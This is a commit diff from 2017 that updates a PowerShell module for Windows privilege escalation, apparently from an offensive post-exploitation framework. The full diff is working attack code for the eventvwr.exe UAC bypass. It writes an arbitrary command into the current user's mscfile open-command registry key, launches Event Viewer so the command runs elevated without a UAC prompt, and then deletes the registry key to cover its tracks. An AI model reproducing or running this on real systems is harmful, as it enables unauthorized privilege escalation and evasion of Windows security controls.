c31aaec94063fa84a1fed69f3b571132fe7db05b
cybervaca <cybervaca@gmail.com>
2017-04-05 13:21:59 +0200

    Update BypassUAC-HackPlayers-eventvwr.ps1

--- data/module_source/privesc/BypassUAC-HackPlayers-eventvwr.ps1
+++ data/module_source/privesc/BypassUAC-HackPlayers-eventvwr.ps1
@@ -1,14 +1,8 @@
 function BypassUAC-HackPlayers-Eventvwr {
 param ([string]$comando)
-New-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile | out-null  
-New-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile\shell | out-null
-New-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open | out-null
-New-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command | out-null
+New-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command -force | out-null
 $key = "registry::HKEY_CURRENT_USER\SOFTWARE\Classes\mscfile\shell\open\command" 
-set-item $Key $comando
-Start-Process eventvwr.exe ; sleep -Seconds 3
-Remove-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command | out-null
-Remove-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\  | out-null
-Remove-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile\shell | out-null
-Remove-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile | out-null
+New-ItemProperty -Path $key -Value $comando -PropertyType string -Force
+Start-Process eventvwr.exe -; sleep -Seconds 3
+Remove-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile -Force | out-null
 }
